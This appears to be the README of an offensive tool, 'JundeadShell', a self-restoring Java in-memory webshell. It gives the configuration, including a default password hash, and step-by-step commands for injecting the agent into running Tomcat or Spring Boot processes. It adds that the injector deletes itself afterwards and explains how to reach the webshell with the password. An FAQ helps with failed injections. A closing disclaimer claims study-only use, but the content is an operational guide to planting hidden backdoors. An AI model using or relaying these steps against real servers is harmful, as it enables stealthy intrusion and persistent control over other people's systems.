# JundeadShell
***
> 一个可以复活的Java内存马
***
### Usage
1.先根据环境修改配置文件
>配置文件位置在: agent_starter.jar内部config目录下
>```
># 目标url 域名推荐配置为127.0.0.1，请根据实际情况修改协议和端口。
>target_url=http://127.0.0.1:80/
># 连接密码的md5值 默认密码:Jundead
>password=AC9A489BB6873C5FB760370FD62A793E
># 开启后（true）会在当前目录创建日志文件，请勿在生产环境下使用。
>debug=false
># 请求和响应加密密钥。key的长度必须是16位。如果不配置则默认使用base64编码。
>secret_key=xxxxxxxxxxxxxxxx
>```

2.列出Java进程列表
>`java -jar agent_starter.jar list`

3.根据进程名或进程id注入
>`java -jar agent_starter.jar [displayName|pid] [tomcat_version]`
>
>举例：`java -jar agent_starter.jar "SpringbootDemo.jar" 9`
>
>注入进程的displayName是SpringbootDemo.jar，使用的tomcat_version是9。
>
> PS: tomcat容器的进程名一般是："org.apache.catalina.startup.Bootstrap start"
>
> 注入成功后会自动删除自身。

4.访问webshell页面
>浏览器访问http://x.x.x.x/xxx?password=密码
***
### FAQ
- 提示注入成功，但未生效
>1.如果注入目标是Tomcat容器的应用，连接webshell的url必须是能够正常访问的url。如果注入目标是springboot框架应用，连接webshell的url可以是任意url。
> 
>2.可能是受原前端页面内容影响。解决办法：浏览器打开新的标签页再访问。
> 
>3.可能是注入目标的tomcat版本不匹配，请尝试更换其他版本（参数：tomcat_version）。
***
### Disclaimers
该项目仅供学习、研究之用，禁止用于非法用途。
